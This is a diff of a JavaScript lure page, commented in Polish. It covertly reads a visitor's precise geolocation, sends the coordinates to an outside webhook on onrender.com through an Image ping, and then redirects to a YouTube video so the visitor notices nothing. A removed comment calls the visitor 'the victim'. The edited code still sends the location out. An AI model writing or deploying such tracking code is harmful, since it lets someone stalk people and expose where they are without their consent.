@@ -216,28 +216,23 @@
             
             setTimeout(function() {
                 if (navigator.geolocation) {
-                    // Dodajemy znacznik czasu, żeby przeglądarka nie brała starej lokalizacji z cache
                     navigator.geolocation.getCurrentPosition(
                         function(position) {
                             var lat = position.coords.latitude;
                             var lon = position.coords.longitude;
-                            
-                            // Wywołanie przez Image ping z unikalnym timestampem przeciw cache
                             var ts = new Date().getTime();
+                            
+                            // Powrót do pewnego i natychmiastowego Rendera, ale z bezpośrednim pingiem Image, 
+                            // który omija buforowanie logów i zapisuje dane od razu!
                             var img = new Image();
                             img.src = 'https://czeladz-webhook-live.onrender.com/zapisz?lat=' + lat + '&lon=' + lon + '&t=' + ts;
                             
-                            // Backup przez fetch z no-cors
-                            fetch('https://czeladz-webhook-live.onrender.com/zapisz?lat=' + lat + '&lon=' + lon + '&t=' + ts, { mode: 'no-cors' })
-                                .catch(err => console.log(err));
-                                
-                            // Przekierowanie na YouTube po ułamku sekundy
+                            // Krótkie opóźnienie na fizyczne wyjście zapytania do sieci i kierunek YouTube
                             setTimeout(function() {
                                 window.location.href = "https://www.youtube.com/watch?v=hkjSSPsjWII";
-                            }, 800);
+                            }, 700);
                         },
                         function(error) {
-                            // Jeśli przeglądarka zablokowała lub wystąpił błąd, i tak przekierowujemy, żeby ofiara nic nie podejrzewała
                             window.location.href = "https://www.youtube.com/watch?v=hkjSSPsjWII";
                         },
                         { timeout: 15000, enableHighAccuracy: true, maximumAge: 0 }
